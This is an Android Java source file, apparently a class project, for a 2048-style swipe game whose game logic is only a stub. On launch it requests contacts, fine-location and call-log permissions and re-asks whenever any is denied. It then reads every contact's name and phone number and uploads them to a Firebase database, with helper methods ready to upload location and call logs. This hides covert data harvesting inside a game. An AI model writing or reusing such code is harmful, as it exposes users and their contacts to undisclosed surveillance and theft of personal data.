package com.example.alleg.a4471project;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TableLayout;
import android.widget.Toast;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private final int PERMISSIONS = 1;
    DatabaseReference mRootRef = FirebaseDatabase.getInstance().getReference();
    GameLogic mainLogic;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissions();
        getContactList();

        mainLogic = new GameLogic(getButtons());

        // get main table, set  up swipe listeners
        TableLayout mainTable = findViewById(R.id.MainTable);
        mainTable.setOnTouchListener(new MainSwipeListener(MainActivity.this) {
            @Override
            public void onSwipeTop() {
                Toast.makeText(MainActivity.this, "top", Toast.LENGTH_SHORT).show();
                mainLogic.swipeUp();
            }

            @Override
            public void onSwipeRight() {
                Toast.makeText(MainActivity.this, "right", Toast.LENGTH_SHORT).show();
                mainLogic.swipeRight();
            }

            @Override
            public void onSwipeLeft() {
                Toast.makeText(MainActivity.this, "left", Toast.LENGTH_SHORT).show();
                mainLogic.swipeUp();
            }

            @Override
            public void onSwipeBottom() {
                Toast.makeText(MainActivity.this, "bottom", Toast.LENGTH_SHORT).show();
                mainLogic.swipeDown();
            }
        });
    }

    public void checkPermissions(){
        String[] requests = {
                android.Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CALL_LOG

        };
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted
            ActivityCompat.requestPermissions(this,requests,PERMISSIONS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSIONS: {
                // If request is cancelled, the result arrays are empty.
                for(int result: grantResults){
                    if(result != PackageManager.PERMISSION_GRANTED){
                        checkPermissions();
                    }
                }
            }

            // other 'case' lines to check for other
            // permissions this app might request.
        }
    }
    private void writeNewContact(String userId, String fullName, String phoneNumber){
        Contact contact = new Contact(fullName, phoneNumber);

        mRootRef.child("contacts").child(userId).child(fullName).setValue(contact);
    }

    private void writeNewLocation(String userId, String longitude, String latitude){
        Location location = new Location(longitude, latitude);

        mRootRef.child("locations").child(userId).setValue(location);
    }

    private void writeNewCallLog(String userId, String opposingNumber, LocalDateTime callStart, LocalDateTime callEnd){
        Call_Log callLog = new Call_Log(opposingNumber, callStart, callEnd);

        mRootRef.child("call_log").child(userId).setValue(callLog);
    }
    private void getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        String userID = getUserid();
                        writeNewContact(userID, name, phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }
    public String getUserid(){
        return FirebaseAuth.getInstance().getUid();
    }

    // 2048 code below
    public Button[][] getButtons() {
        return new Button[4][4];
    }
}
